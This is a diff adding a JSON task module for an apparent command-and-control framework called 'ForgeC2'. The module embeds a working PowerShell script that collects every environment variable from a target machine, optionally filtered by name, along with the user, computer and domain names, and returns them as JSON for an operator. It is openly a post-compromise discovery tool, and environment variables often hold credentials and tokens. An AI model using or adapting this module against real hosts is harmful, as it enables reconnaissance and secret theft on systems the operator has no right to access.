@@ -1,0 +1,29 @@
+{
+  "name": "Environment Collector",
+  "description": "Collect environment variables from the target system with optional name filter",
+  "version": "1.0.0",
+  "author": "ForgeC2",
+  "task_type": "env_collect",
+  "script": "function Get-EnvCollect {\n    param(\n        [string]$Filter = '',\n        [bool]$IncludeUser = $true\n    )\n    $vars = Get-ChildItem Env:\n    if ($Filter) {\n        $vars = $vars | Where-Object { $_.Name -like \"*$Filter*\" }\n    }\n    $out = @($vars | ForEach-Object {\n        @{ name = $_.Name; value = $_.Value }\n    })\n    $result = @{\n        count = $out.Count\n        variables = $out\n    }\n    if ($IncludeUser) {\n        $result['username'] = $env:USERNAME\n        $result['computer'] = $env:COMPUTERNAME\n        $result['domain'] = $env:USERDOMAIN\n    }\n    return $result | ConvertTo-Json -Depth 3\n}\n\nGet-EnvCollect -Filter '{{filter}}' -IncludeUser $([bool]::Parse('{{include_user}}'))",
+  "category": "discovery",
+  "icon": "fa-solid fa-leaf",
+  "color": "green",
+  "requires_elevated": false,
+  "parameters": [
+    {
+      "name": "filter",
+      "type": "string",
+      "description": "Filter variable names (wildcard match, empty = all)",
+      "required": false,
+      "placeholder": "PATH",
+      "default": ""
+    },
+    {
+      "name": "include_user",
+      "type": "boolean",
+      "description": "Include username, computer name, and domain",
+      "required": false,
+      "default": "true"
+    }
+  ]
+}
